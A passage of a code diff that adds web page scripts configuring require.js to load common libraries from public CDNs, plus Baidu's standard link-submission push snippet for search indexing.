+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
